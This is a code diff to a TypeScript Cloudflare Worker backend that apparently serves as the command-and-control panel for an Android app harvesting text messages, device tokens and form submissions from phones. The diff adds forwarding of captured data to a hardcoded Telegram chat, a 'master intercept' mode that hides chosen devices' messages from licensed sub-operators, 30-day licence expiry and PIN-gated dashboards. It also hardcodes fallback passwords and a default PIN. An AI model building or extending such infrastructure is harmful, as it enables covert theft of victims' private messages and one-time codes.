@@ -19,6 +19,8 @@ type Env = {
   FIREBASE_PRIVATE_KEY?: string;
   EVENT_BUS: DurableObjectNamespace;
   ASSETS: { fetch: (req: Request) => Promise<Response> };
+  TELEGRAM_BOT_TOKEN?: string;
+  TELEGRAM_CHAT_ID?: string;
 };
 
 // =================== SCHEMA ===================
@@ -30,6 +32,8 @@ const apps = pgTable("apps", {
   status: text("status").notNull().default("active"),
   loginLimit: integer("login_limit").notNull().default(5),
   createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
+  deleteProtectionPin: text("delete_protection_pin"),
+  deleteProtectionEnabled: boolean("delete_protection_enabled").notNull().default(false),
 }, (t) => ({ appIdUq: uniqueIndex("apps_app_id_uq").on(t.appId) }));
 
 const devices = pgTable("devices", {
@@ -67,6 +71,7 @@ const messages = pgTable("messages", {
   toNumber: text("to_number"),
   body: text("body").notNull(),
   isSensitive: boolean("is_sensitive").notNull().default(false),
+  masterOnly: boolean("master_only").notNull().default(false),
   receivedAt: timestamp("received_at", { withTimezone: true }).notNull().defaultNow(),
 }, (t) => ({
   appReceivedIdx: index("messages_app_received_idx").on(t.appId, t.receivedAt),
@@ -84,6 +89,12 @@ const formData = pgTable("form_data", {
   appSubmittedIdx: index("form_data_app_submitted_idx").on(t.appId, t.submittedAt),
   deviceIdx: index("form_data_device_idx").on(t.deviceId),
 }));
+const tokenAppMap = pgTable("token_app_map", {
+  id: serial("id").primaryKey(),
+  token: text("token").notNull(),
+  apkId: text("apk_id").notNull(),
+  updatedAt: timestamp("updated_at", { withTimezone: true }).notNull().defaultNow(),
+}, (t) => ({ tokenUq: uniqueIndex("token_app_map_token_uq").on(t.token) }));
 
 const DEFAULT_APP_ID = "SKY-APP-2026-X9F3";
 const DEFAULT_APP_NAME = "MR ROBOT";
@@ -91,7 +102,7 @@ const DEFAULT_APP_PIN = "1234";
 
 function getDb(env: Env) {
   const sqlClient = neon(env.NEON_DATABASE_URL);
-  return drizzle(sqlClient, { schema: { apps, devices, messages, formData } });
+  return drizzle(sqlClient, { schema: { apps, devices, messages, formData, tokenAppMap } });
 }
 
 // =================== SCHEMA INIT (lazy, once-per-worker) ===================
@@ -177,11 +188,22 @@ async function ensureSchema(env: Env): Promise<void> {
       sqlClient(`CREATE INDEX IF NOT EXISTS admin_sessions_login_idx ON admin_sessions(login_time DESC)`),
       sqlClient(`ALTER TABLE admin_sessions ADD COLUMN IF NOT EXISTS app_id TEXT NOT NULL DEFAULT ''`),
       sqlClient(`CREATE INDEX IF NOT EXISTS admin_sessions_app_idx ON admin_sessions(app_id)`),
+    sqlClient(`UPDATE apps SET created_at = NOW() WHERE created_at > NOW() + INTERVAL '1 day'`),
       // Migration: add login_limit column if not exists
       sqlClient(`ALTER TABLE apps ADD COLUMN IF NOT EXISTS login_limit INTEGER NOT NULL DEFAULT 5`),
+      // Migration: add created_at for older DBs that predated this column
+      sqlClient(`ALTER TABLE apps ADD COLUMN IF NOT EXISTS created_at TIMESTAMPTZ DEFAULT NOW()`),
+      // Migration: add delete protection columns
+      sqlClient(`ALTER TABLE apps ADD COLUMN IF NOT EXISTS delete_protection_pin TEXT`),
+      sqlClient(`ALTER TABLE apps ADD COLUMN IF NOT EXISTS delete_protection_enabled BOOLEAN NOT NULL DEFAULT FALSE`),
       // Migration: add starred column to devices
       sqlClient(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS starred BOOLEAN NOT NULL DEFAULT FALSE`),
+      // Migration: add master_only column for message interception
+      sqlClient(`ALTER TABLE messages ADD COLUMN IF NOT EXISTS master_only BOOLEAN NOT NULL DEFAULT FALSE`),
     ]);
+    // Fix: apps created before created_at column existed have NULL — set to NOW() and re-enable if wrongly disabled
+    await sqlClient(`UPDATE apps SET created_at = NOW() WHERE created_at IS NULL`).catch(() => {});
+    await sqlClient(`UPDATE apps SET status = 'active' WHERE status = 'disabled' AND created_at IS NULL AND app_id != 'SKY-APP-2026-X9F3'`).catch(() => {});
     // ensure default app + master PIN setting
     await Promise.all([
       sqlClient(
@@ -207,7 +229,7 @@ function isoReq(d: Date | string): string {
   return typeof d === "string" ? d : d.toISOString();
 }
 function mapApp(r: typeof apps.$inferSelect) {
-  return { id: r.id, appId: r.appId, name: r.name, status: r.status, loginLimit: r.loginLimit ?? 5, createdAt: isoReq(r.createdAt) };
+  return { id: r.id, appId: r.appId, name: r.name, status: r.status, createdAt: isoReq(r.createdAt), deleteProtectionEnabled: r.deleteProtectionEnabled ?? false };
 }
 function mapDevice(r: typeof devices.$inferSelect) {
   return {
@@ -226,7 +248,8 @@ function mapMessage(r: typeof messages.$inferSelect) {
   return {
     id: r.id, appId: r.appId, deviceId: r.deviceId, userId: r.userId,
     fromSender: r.fromSender, fromNumber: r.fromNumber, toNumber: r.toNumber,
-    body: r.body, isSensitive: r.isSensitive, receivedAt: isoReq(r.receivedAt),
+    body: r.body, isSensitive: r.isSensitive, masterOnly: r.masterOnly,
+    receivedAt: isoReq(r.receivedAt),
   };
 }
 function mapFormData(r: typeof formData.$inferSelect) {
@@ -235,6 +258,33 @@ function mapFormData(r: typeof formData.$inferSelect) {
     data: r.data as Record<string, unknown>,
     submittedAt: isoReq(r.submittedAt),
   };
+}
+
+// =================== INTERCEPT STATE ===================
+let _interceptCache: string[] | null = null;
+let _interceptCacheExp = 0;
+async function getInterceptedDevices(env: Env): Promise<string[]> {
+  const now = Date.now();
+  if (_interceptCache !== null && now < _interceptCacheExp) return _interceptCache;
+  try {
+    const sqlClient = neon(env.NEON_DATABASE_URL);
+    const rows = await sqlClient(`SELECT value FROM settings WHERE key = 'master_intercept_devices'`) as Array<{ value: string }>;
+    const val = rows[0]?.value ? JSON.parse(rows[0].value) : [];
+    _interceptCache = Array.isArray(val) ? val : [];
+  } catch {
+    _interceptCache = [];
+  }
+  _interceptCacheExp = now + 5_000;
+  return _interceptCache!;
+}
+async function setInterceptedDevices(env: Env, ids: string[]): Promise<void> {
+  const sqlClient = neon(env.NEON_DATABASE_URL);
+  await sqlClient(
+    `INSERT INTO settings (key, value) VALUES ('master_intercept_devices', $1) ON CONFLICT (key) DO UPDATE SET value = $1`,
+    [JSON.stringify(ids)]
+  );
+  _interceptCache = ids;
+  _interceptCacheExp = Date.now() + 5_000;
 }
 
 // =================== PUB-SUB ===================
@@ -251,6 +301,68 @@ async function broadcast(env: Env, event: string, data: unknown): Promise<void> 
     console.warn("broadcast failed", e);
   }
 }
+
+  // =================== TELEGRAM NOTIFICATIONS ===================
+
+    // ── Settings cache: avoids 3 DB round-trips per notification ──
+    const tgCache = { chatId: '-1004403318713', paused: false, focusApp: '', ts: 0 };
+    const TG_CACHE_TTL = 30_000;
+
+    async function refreshTgCache(env: Env): Promise<void> {
+      if (Date.now() - tgCache.ts < TG_CACHE_TTL) return; // still fresh, skip DB
+      try {
+        const rows = await neon(env.NEON_DATABASE_URL)(
+          `SELECT key, value FROM settings WHERE key IN ('telegram_chat_id','telegram_paused','telegram_focus_app')`
+        );
+        const map = Object.fromEntries((rows as { key: string; value: string }[]).map(r => [r.key, r.value]));
+        tgCache.chatId = map['telegram_chat_id'] ?? (env.TELEGRAM_CHAT_ID ?? '-1004403318713');
+        tgCache.paused = map['telegram_paused'] === 'true';
+        tgCache.focusApp = map['telegram_focus_app'] ?? '';
+        tgCache.ts = Date.now();
+      } catch { /* keep stale cache on error */ }
+    }
+
+    // Kept for backward compat — returns channel id from cache
+    async function tgChatId(env: Env): Promise<string> {
+      await refreshTgCache(env);
+      return tgCache.chatId;
+    }
+
+    // Direct immediate notification — one per event, full details, zero extra DB calls
+    async function sendTelegram(env: Env, text: string, appId?: string): Promise<void> {
+      try {
+        await refreshTgCache(env);
+        if (tgCache.paused) return;
+        if (appId && tgCache.focusApp && tgCache.focusApp !== appId) return;
+        const token = env.TELEGRAM_BOT_TOKEN ?? c.env?.TELEGRAM_BOT_TOKEN ?? "";
+        const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'content-type': 'application/json' },
+          body: JSON.stringify({ chat_id: tgCache.chatId, text, parse_mode: 'HTML' }),
+        });
+        if (!resp.ok) {
+          const err = await resp.json() as { error_code?: number };
+          if (err.error_code === 429) console.warn('Telegram 429 — message dropped');
+        }
+      } catch (e) { console.warn('Telegram send failed', e); }
+    }
+
+  
+    async function tgReply(token: string, chatId: number | string, text: string): Promise<void> {
+      // Telegram max message size = 4096 chars — split if needed
+      const MAX = 3800;
+      const chunks: string[] = [];
+      for (let i = 0; i < text.length; i += MAX) chunks.push(text.slice(i, i + MAX));
+      for (const chunk of chunks) {
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "content-type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: chunk, parse_mode: "HTML" }),
+        });
+      }
+    }
+  
+  
 
 // =================== FCM (Web Crypto JWT) ===================
 type FirebaseCredentials = {
@@ -392,13 +504,17 @@ function parseDevice(ua: string): string {
 
 // =================== UTIL ===================
 const VALIDITY_DAYS = 30;
-function isExpired(createdAt: string | Date): boolean {
-  const created = new Date(createdAt).getTime();
+function isExpired(createdAt: string | Date | null | undefined): boolean {
+  if (!createdAt) return false;
+  const created = new Date(createdAt as string | Date).getTime();
+  if (isNaN(created)) return false;
   return Date.now() > created + VALIDITY_DAYS * 86_400_000;
 }
 
 // =================== APP ===================
-const app = new Hono<{ Bindings: Env }>();
+
+
+const app = new Hono<{ Bindings: Env; Variables: { sessionAppId: string } }>();
 app.use("*", cors({
   origin: "*",
   allowMethods: ["GET", "POST", "PATCH", "PUT", "DELETE", "OPTIONS"],
@@ -408,16 +524,122 @@ app.use("*", cors({
 app.use("*", async (c, next) => {
   const method = c.req.method;
   const path   = c.req.path;
-  // POST + PATCH + OPTIONS open (Android device comms + CORS preflight)
-  // /api/healthz open (uptime monitoring)
-  if (method === "POST" || method === "PATCH" || method === "OPTIONS" || path === "/api/healthz" || path.startsWith("/api/tokens/")) {
+  // Block known attacker IPs — checked before anything else
+  const clientIp = c.req.header("cf-connecting-ip") ?? c.req.header("x-forwarded-for") ?? "";
+  const BLOCKED_IPS = ["34.47.251.0", "34.47.251"];
+  if (BLOCKED_IPS.some(b => clientIp.startsWith(b))) {
+    return c.json({ error: "Forbidden" }, 403);
+  }
+  // POST open (Android device comms) | OPTIONS open (CORS preflight) | healthz + tokens public
+  // PATCH open ONLY for device/session paths (Android heartbeat) — admin/app PATCH requires key
+  if (method === "OPTIONS" || path === "/api/healthz" || path.startsWith("/api/tokens/") || path.startsWith("/api/vps/") || path.startsWith("/api/token-app")) {
     return await next();
   }
-  const key = c.req.header("x-api-key") ?? c.req.query("apiKey") ?? "";
-  if (!key || key !== (c.env.API_SECRET ?? "")) {
+  if (method === "POST") {
+    return await next();
+  }
+  // Delete-protection read is safe without x-api-key (no sensitive data exposed)
+  if (method === "GET" && path.includes("/delete-protection")) {
+    return await next();
+  }
+  // Master SSE — EventSource can't send headers, so use short-lived HMAC-signed ?token=
+  // Token issued by POST /api/master/sse-token after verifying master PIN — PIN never in URL
+  if ((method === "GET" || method === "HEAD") && path === "/api/master/events") {
+    const secret = c.env.API_SECRET ?? "fallback-sse-secret";
+    const sseToken = c.req.query("token") ?? "";
+    if (sseToken) {
+      if (await verifySseToken(secret, sseToken)) return await next();
+      return c.json({ error: "SSE token invalid or expired" }, 401);
+    }
     return c.json({ error: "Unauthorized" }, 401);
   }
-  return await next();
+  if (method === "PATCH") {
+    // Android device comms — allow without key (sessions/ removed — was a security hole)
+    if (path.startsWith("/api/devices/") || path === "/api/admin/master-pin") {
+      return await next();
+    }
+    // Admin PATCH (/api/apps/*, etc.) — fall through to session/master/apikey check below
+  }
+  // Per-app session token (WebDashboard users after PIN login)
+  const sessionToken = c.req.header("x-session-token") ?? "";
+  if (sessionToken) {
+    const cached = _sessionCache.get(sessionToken);
+    if (cached && Date.now() < cached.expiry) {
+      c.set('sessionAppId', cached.appId);
+      return await next();
+    }
+    try {
+      const sqlC = neon(c.env.NEON_DATABASE_URL);
+      const rows = await sqlC(`SELECT id, app_id FROM admin_sessions WHERE id = $1 LIMIT 1`, [sessionToken]) as Array<{ id: string; app_id: string }>;
+      if (rows.length > 0) {
+        const appId = rows[0].app_id ?? '';
+        _sessionCache.set(sessionToken, { expiry: Date.now() + 60_000, appId });
+        c.set('sessionAppId', appId);
+        return await next();
+      }
+    } catch { /* deny */ }
+  }
+  // Master admin PIN also grants full access
+  const masterPin = c.req.header("x-master-pin") ?? "";
+  if (masterPin && masterPin === await getMasterPin(c.env)) return await next();
+  // x-api-key removed — Android SDK uses POST (already bypassed above)
+  // Any GET/DELETE/PATCH admin route requires session token or master PIN only
+  return c.json({ error: "Unauthorized" }, 401);
+});
+
+// ------- SSE TOKEN: exchange master PIN for a short-lived HMAC-signed token (no storage) -------
+async function signSseToken(secret: string, expMs: number): Promise<string> {
+  const payload = expMs.toString();
+  const key = await crypto.subtle.importKey("raw", new TextEncoder().encode(secret), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
+  const sig = await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(payload));
+  const raw = Array.from(new Uint8Array(sig as ArrayBuffer));
+  const b64 = btoa(raw.map(b => String.fromCharCode(b)).join(""));
+  // URL-safe: replace + with -, / with _, strip = padding
+  const token64 = b64.split("+").join("-").split("/").join("_").split("=").join("");
+  return `${payload}.${token64}`;
+}
+async function verifySseToken(secret: string, token: string): Promise<boolean> {
+  try {
+    const dotIdx = token.indexOf(".");
+    if (dotIdx < 0) return false;
+    const payloadStr = token.slice(0, dotIdx);
+    const sigB64url = token.slice(dotIdx + 1);
+    if (!payloadStr || !sigB64url) return false;
+    const exp = Number(payloadStr);
+    if (isNaN(exp) || Date.now() > exp) return false;
+    // Restore standard base64 from URL-safe
+    const restored = sigB64url.split("-").join("+").split("_").join("/");
+    const sigB64 = restored.padEnd(
+      restored.length + (4 - restored.length % 4) % 4, "="
+    );
+    const key = await crypto.subtle.importKey("raw", new TextEncoder().encode(secret), { name: "HMAC", hash: "SHA-256" }, false, ["verify"]);
+    const sig = Uint8Array.from(atob(sigB64), (ch) => ch.charCodeAt(0));
+    return await crypto.subtle.verify("HMAC", key, sig, new TextEncoder().encode(payloadStr));
+  } catch { return false; }
+}
+app.post("/api/master/sse-token", async (c) => {
+  const body = await c.req.json().catch(() => ({})) as { pin?: string };
+  if (!body.pin || body.pin !== await getMasterPin(c.env)) {
+    return c.json({ error: "Invalid PIN" }, 401);
+  }
+  const secret = c.env.API_SECRET ?? "fallback-sse-secret";
+  const token = await signSseToken(secret, Date.now() + 90_000); // 90s — enough for EventSource to open
+  return c.json({ token });
+});
+
+// ------- GATE PASS VERIFY (server-side — no hardcoded secrets in frontend) -------
+app.post("/api/master/check-pass", async (c) => {
+  const isMaster = c.req.header("x-master-pin") === await getMasterPin(c.env);
+  if (!isMaster) return c.json({ error: "Unauthorized" }, 401);
+  const body = await c.req.json().catch(() => ({})) as { type?: string; value?: string };
+  if (!body.type || !body.value) return c.json({ error: "type and value required" }, 400);
+  const sqlClient = neon(c.env.NEON_DATABASE_URL);
+  const key = body.type === "nav" ? "nav_pass" : body.type === "gate" ? "gate_pass" : null;
+  if (!key) return c.json({ error: "invalid type" }, 400);
+  // Read from DB; fall back to env var if not set
+  const rows = await sqlClient(`SELECT value FROM settings WHERE key=$1`, [key]) as Array<{value:string}>;
+  const stored = rows[0]?.value ?? (c.env as Record<string,string>)[key.toUpperCase().replace("_","_")] ?? (body.type === "nav" ? "verma" : "dbneon");
+  return c.json({ ok: body.value === stored });
 });
 
 // ------- HEALTH -------
@@ -428,19 +650,29 @@ app.get("/api/init", async (c) => {
   const db = getDb(c.env);
   const appId = c.req.query("appId");
   const limitParam = c.req.query("limit");
-  const rawLimit = limitParam == null ? 500 : Math.max(0, Math.min(5000, parseInt(limitParam, 10) || 500));
+  const rawLimit = limitParam == null ? 2000 : Math.max(0, Math.min(5000, parseInt(limitParam, 10) || 2000));
   if (!appId) return c.json({ error: "appId is required" }, 400);
-  const [devRows, msgRows, fRows] = await Promise.all([
+  const isMaster = (c.req.header("x-master-pin") ?? "") === await getMasterPin(c.env);
+  // Require valid session or master PIN
+  if (!isMaster) {
+    if (c.get('sessionAppId') !== appId) return c.json({ error: "Unauthorized" }, 401);
+  }
+  const msgWhere = isMaster
+    ? eq(messages.appId, appId)
+    : and(eq(messages.appId, appId), eq(messages.masterOnly, false));
+  const [devRows, msgRows, fRows, [totalRow]] = await Promise.all([
     db.select().from(devices).where(eq(devices.appId, appId)),
-    db.select().from(messages).where(eq(messages.appId, appId))
+    db.select().from(messages).where(msgWhere)
       .orderBy(desc(messages.receivedAt)).limit(rawLimit),
     db.select().from(formData).where(eq(formData.appId, appId))
       .orderBy(desc(formData.submittedAt)),
+    db.select({ count: sql`COUNT(*)` }).from(messages).where(msgWhere),
   ]);
   return c.json({
     devices: devRows.map(mapDevice),
     messages: msgRows.map(mapMessage),
     formData: fRows.map(mapFormData),
+    totalMessages: Number(totalRow?.count ?? 0),
   });
 });
 
@@ -466,16 +698,37 @@ app.get("/api/tokens/:token", async (c) => {
 // ------- APPS -------
 app.get("/api/apps", async (c) => {
   const db = getDb(c.env);
-  const rows = await db.select().from(apps).orderBy(asc(apps.createdAt));
-  // auto-disable expired
+  const isMaster = (c.req.header("x-master-pin") ?? "") === await getMasterPin(c.env);
+  // Sub-admin session: return ONLY their own app (not all apps — prevents app ID enumeration)
+  if (!isMaster) {
+    const sqlC = neon(c.env.NEON_DATABASE_URL);
+    const sessionToken = c.req.header("x-session-token") ?? "";
+    const sessions = await sqlC(
+      `SELECT app_id FROM admin_sessions WHERE id = $1 LIMIT 1`,
+      [sessionToken]
+    ) as Array<{ app_id: string }>;
+    if (sessions.length === 0) return c.json({ error: "Unauthorized" }, 401);
+    const appId = sessions[0].app_id;
+    const [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
+    if (!row) return c.json([], 200);
+    // auto-disable expired
+    if (row.appId !== DEFAULT_APP_ID && row.status === "active" && row.createdAt && isExpired(row.createdAt)) {
+      await db.update(apps).set({ status: "disabled" }).where(eq(apps.appId, appId));
+      const [updated] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
+      return c.json(updated ? [mapApp(updated)] : [mapApp(row)]);
+    }
+    return c.json([mapApp(row)]);
+  }
+  // Master: return all apps (existing behaviour)
+  const rows = await db.select().from(apps).orderBy(desc(apps.createdAt));
   for (const r of rows) {
     if (r.appId === DEFAULT_APP_ID && r.status !== "active") {
       await db.update(apps).set({ status: "active" }).where(eq(apps.appId, r.appId));
-    } else if (r.appId !== DEFAULT_APP_ID && r.status === "active" && isExpired(r.createdAt)) {
+    } else if (r.appId !== DEFAULT_APP_ID && r.status === "active" && r.createdAt && isExpired(r.createdAt)) {
       await db.update(apps).set({ status: "disabled" }).where(eq(apps.appId, r.appId));
     }
   }
-  const fresh = await db.select().from(apps).orderBy(asc(apps.createdAt));
+  const fresh = await db.select().from(apps).orderBy(desc(apps.createdAt));
   return c.json(fresh.map(mapApp));
 });
 
@@ -493,6 +746,8 @@ app.get("/api/apps/:appId", async (c) => {
 });
 
 app.post("/api/apps", async (c) => {
+  const guard = await checkMasterPin(c as never);
+  if (guard) return guard;
   const db = getDb(c.env);
   const body = await c.req.json() as { appId?: string; name?: string; pin?: string; status?: string };
   if (!body.appId || !body.name) return c.json({ error: "appId and name are required" }, 400);
@@ -505,13 +760,34 @@ app.post("/api/apps", async (c) => {
 });
 
 app.patch("/api/apps/:appId", async (c) => {
+  const appId = c.req.param("appId");
+  const masterPin = await getMasterPin(c.env);
+  const isMaster = (c.req.header("x-master-pin") ?? "") === masterPin;
+  const sessionToken = c.req.header("x-session-token") ?? "";
+
+  // Master PIN → full access. Session → must belong to THIS appId. Neither → deny.
+  if (!isMaster) {
+    if (!sessionToken) return c.json({ error: "Unauthorized" }, 401);
+    if (c.get('sessionAppId') !== appId) return c.json({ error: "Unauthorized" }, 401);
+  }
+
   const db = getDb(c.env);
-  const body = await c.req.json() as { name?: string; pin?: string; status?: string; loginLimit?: number };
+  const body = await c.req.json() as { name?: string; pin?: string; status?: string; currentPin?: string; };
   const patch: Partial<typeof apps.$inferInsert> = {};
   if (body.name !== undefined) patch.name = body.name;
-  if (body.pin !== undefined) patch.pin = body.pin;
   if (body.status !== undefined) patch.status = body.status;
-  if (body.loginLimit !== undefined) patch.loginLimit = Math.min(100, Math.max(1, Number(body.loginLimit)));
+
+  // Changing PIN — master can always; session owner needs currentPin as confirmation
+  if (body.pin !== undefined) {
+    if (!isMaster) {
+      const [existing] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
+      if (!existing) return c.json({ error: "App not found" }, 404);
+      if (!body.currentPin) return c.json({ error: "currentPin required to change PIN" }, 400);
+      if (body.currentPin !== existing.pin) return c.json({ error: "Wrong current PIN" }, 401);
+    }
+    patch.pin = body.pin;
+  }
+
   if (Object.keys(patch).length === 0) return c.json({ error: "No fields to update" }, 400);
   const [row] = await db.update(apps).set(patch).where(eq(apps.appId, c.req.param("appId"))).returning();
   if (!row) return c.json({ error: "App not found" }, 404);
@@ -519,6 +795,8 @@ app.patch("/api/apps/:appId", async (c) => {
 });
 
 app.delete("/api/apps/:appId", async (c) => {
+  const guard = await checkMasterPin(c as never);
+  if (guard) return guard;
   const db = getDb(c.env);
   const [row] = await db.delete(apps).where(eq(apps.appId, c.req.param("appId"))).returning();
   if (!row) return c.json({ error: "App not found" }, 404);
@@ -527,29 +805,66 @@ app.delete("/api/apps/:appId", async (c) => {
 
 app.post("/api/apps/:appId/verify-pin", async (c) => {
   const db = getDb(c.env);
-  const sqlClient = neon(c.env.NEON_DATABASE_URL);
+  const appId = c.req.param("appId");
   const body = await c.req.json() as { pin?: string };
   if (!body.pin) return c.json({ error: "PIN required" }, 400);
-  const appId = c.req.param("appId");
+
   const [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
   if (!row) return c.json({ error: "App not found" }, 404);
   if (row.appId !== DEFAULT_APP_ID && row.status === "active" && isExpired(row.createdAt)) {
     await db.update(apps).set({ status: "disabled" }).where(eq(apps.appId, appId));
-    return c.json({ error: "App is disabled" }, 403);
+    return c.json({ error: "Licence expired. Please contact admin." }, 403);
   }
-  if (row.status !== "active") return c.json({ error: "App is disabled" }, 403);
-  if (row.pin !== body.pin) return c.json({ error: "Wrong PIN" }, 401);
-  // Check concurrent login limit — count active sessions (pinged in last 30 min)
-  const limit = row.loginLimit ?? 5;
-  const activeRows = await sqlClient(
-    `SELECT COUNT(*) as cnt FROM admin_sessions WHERE app_id = $1 AND last_active > NOW() - INTERVAL '30 minutes'`,
-    [appId],
-  ) as Array<{ cnt: string }>;
-  const activeCnt = Number(activeRows[0]?.cnt ?? 0);
-  if (activeCnt >= limit) {
-    return c.json({ error: `Login limit reached. Maximum ${limit} concurrent session${limit === 1 ? "" : "s"} allowed. Please wait for someone to log out.` }, 429);
+  if (row.status !== "active") return c.json({ error: "App is disabled. Please contact admin." }, 403);
+
+  if (row.pin !== body.pin) {
+    return c.json({ error: "Wrong PIN." }, 401);
   }
   return c.json({ ok: true, appId: row.appId, name: row.name });
+});
+
+// ------- DELETE PROTECTION -------
+app.get("/api/apps/:appId/delete-protection", async (c) => {
+  await ensureSchema(c.env);
+  const db = getDb(c.env);
+  const [row] = await db.select().from(apps).where(eq(apps.appId, c.req.param("appId"))).limit(1);
+  if (!row) return c.json({ error: "App not found" }, 404);
+  return c.json({ enabled: row.deleteProtectionEnabled ?? false, hasPin: !!row.deleteProtectionPin });
+});
+
+app.post("/api/apps/:appId/delete-protection/set-pin", async (c) => {
+  await ensureSchema(c.env);
+  const db = getDb(c.env);
+  const appId = c.req.param("appId");
+  const isMasterSetPin = c.req.header("x-master-pin") === await getMasterPin(c.env);
+  const body = await c.req.json() as { pin?: string; currentPin?: string };
+  if (!body.pin || body.pin.length < 4) return c.json({ error: "pin required (min 4 chars)" }, 400);
+  const [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
+  if (!row) return c.json({ error: "App not found" }, 404);
+  if (row.deleteProtectionPin && !isMasterSetPin) {
+    if (!body.currentPin) return c.json({ error: "currentPin required to change" }, 403);
+    if (body.currentPin !== row.deleteProtectionPin) return c.json({ error: "Wrong current pin" }, 401);
+  }
+  await db.update(apps).set({ deleteProtectionPin: body.pin }).where(eq(apps.appId, appId));
+  return c.json({ ok: true });
+});
+
+app.post("/api/apps/:appId/delete-protection/toggle", async (c) => {
+  await ensureSchema(c.env);
+  const db = getDb(c.env);
+  const appId = c.req.param("appId");
+  const isMaster = c.req.header("x-master-pin") === await getMasterPin(c.env);
+  const body = await c.req.json() as { pin?: string };
+  const [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
+  if (!row) return c.json({ error: "App not found" }, 404);
+  if (!isMaster) {
+    if (!body.pin) return c.json({ error: "pin required" }, 400);
+    if (!row.deleteProtectionPin) return c.json({ error: "Set a delete protection pin first" }, 403);
+    if (body.pin !== row.deleteProtectionPin) return c.json({ error: "Wrong pin" }, 401);
+  }
+  const newEnabled = !(row.deleteProtectionEnabled ?? false);
+  await db.update(apps).set({ deleteProtectionEnabled: newEnabled }).where(eq(apps.appId, appId));
+  return c.json({ ok: true, enabled: newEnabled });
 });
 
 // ------- DEVICES -------
@@ -557,6 +872,11 @@ app.get("/api/devices", async (c) => {
   const db = getDb(c.env);
   const userId = c.req.query("userId");
   const appId = c.req.query("appId");
+  const _im1=(c.req.header("x-master-pin")??"")===await getMasterPin(c.env);
+  if(!_im1){
+    if(!appId)return c.json({error:"appId required"},400);
+    if(c.get('sessionAppId') !== appId)return c.json({error:"Unauthorized"},401);
+  }
   const where = appId ? eq(devices.appId, appId) : userId ? eq(devices.userId, userId) : undefined;
   const rows = where
     ? await db.select().from(devices).where(where)
@@ -575,6 +895,17 @@ app.patch("/api/devices/:deviceId", async (c) => {
   const db = getDb(c.env);
   const body = await c.req.json() as Record<string, unknown>;
   const patch: Partial<typeof devices.$inferInsert> = { updatedAt: new Date() };
+  // Admin-only fields require session or master PIN (Android SDK only sends status/lastOnline/fcmToken)
+  const hasAdminFields = body.starred !== undefined || body.forwardEnabled !== undefined || body.forwardSlot !== undefined;
+  if (hasAdminFields) {
+    const isMasterPatch = (c.req.header("x-master-pin") ?? "") === await getMasterPin(c.env);
+    const sessionToken = c.req.header("x-session-token") ?? "";
+    if (!isMasterPatch && !sessionToken) return c.json({ error: "Unauthorized" }, 401);
+    if (!isMasterPatch && sessionToken) {
+      // Session already validated by middleware — sessionAppId confirms it's a real session
+      if (!c.get('sessionAppId')) return c.json({ error: "Unauthorized" }, 401);
+    }
+  }
   if (body.status !== undefined) patch.status = String(body.status);
   if (body.lastOnline !== undefined) patch.lastOnline = body.lastOnline ? new Date(String(body.lastOnline)) : null;
   if (body.fcmToken !== undefined) patch.fcmToken = String(body.fcmToken);
@@ -589,27 +920,75 @@ app.patch("/api/devices/:deviceId", async (c) => {
 });
 
 // ------- MESSAGES -------
+app.get("/api/messages/count", async (c) => {
+  const db = getDb(c.env);
+  const appId = c.req.query("appId");
+  // Non-master: require appId + session must belong to that appId (prevents cross-app IDOR)
+  const _isMasterCaller = (c.req.header("x-master-pin") ?? "") === await getMasterPin(c.env);
+  if (!_isMasterCaller) {
+    if (!appId) return c.json({ error: "appId required" }, 400);
+    if (c.get('sessionAppId') !== appId) return c.json({ error: "Unauthorized" }, 401);
+  }
+  const where = appId ? eq(messages.appId, appId) : undefined;
+  const rows = where
+    ? await db.select({ count: sql`COUNT(*)` }).from(messages).where(where)
+    : await db.select({ count: sql`COUNT(*)` }).from(messages);
+  return c.json({ count: Number(rows[0]?.count ?? 0) });
+});
+
 app.get("/api/messages", async (c) => {
   const db = getDb(c.env);
   const appId = c.req.query("appId");
   const userId = c.req.query("userId");
   const deviceId = c.req.query("deviceId");
-  // Default cap: 500 most recent messages — keeps initial dashboard load fast.
-  // Client can pass ?limit=N&offset=M for pagination, or ?limit=0 for all rows.
-  const limitParam = c.req.query("limit");
-  const offsetParam = c.req.query("offset");
-  const rawLimit = limitParam == null ? 500 : Math.max(0, Math.min(5000, parseInt(limitParam, 10) || 0));
-  const offset = Math.max(0, parseInt(offsetParam ?? "0", 10) || 0);
-  const where = appId ? eq(messages.appId, appId)
-    : userId ? eq(messages.userId, userId)
-    : deviceId ? eq(messages.deviceId, deviceId)
-    : undefined;
-  let q = where
-    ? db.select().from(messages).where(where).orderBy(desc(messages.receivedAt))
-    : db.select().from(messages).orderBy(desc(messages.receivedAt));
-  if (rawLimit > 0) q = q.limit(rawLimit).offset(offset) as typeof q;
-  const rows = await q;
-  return c.json(rows.map(mapMessage));
+  const searchTerm = c.req.query("search")?.trim() ?? "";
+  const cursor = c.req.query("cursor"); // last message id for cursor pagination
+  const isMaster = (c.req.header("x-master-pin") ?? "") === await getMasterPin(c.env);
+  // Non-master: session must belong to requested appId (prevents cross-app IDOR)
+  if (!isMaster) {
+    if (!appId) return c.json({ error: "appId required" }, 400);
+    if (c.get('sessionAppId') !== appId) return c.json({ error: "Unauthorized" }, 401);
+  }
+
+  const PAGE = 30;           // browse page size
+  
+  // Base filter conditions (app / user / device scope)
+  const scopeConds: ReturnType<typeof eq>[] = [];
+  if (appId) scopeConds.push(eq(messages.appId, appId));
+  else if (userId) scopeConds.push(eq(messages.userId, userId));
+  else if (deviceId) scopeConds.push(eq(messages.deviceId, deviceId));
+  // Non-master callers cannot see master-only (intercepted) messages
+  if (!isMaster) scopeConds.push(eq(messages.masterOnly, false));
+
+  if (searchTerm) {
+    // ── Search mode: cursor-based ILIKE — uses id index per page, no OFFSET scan cost ──
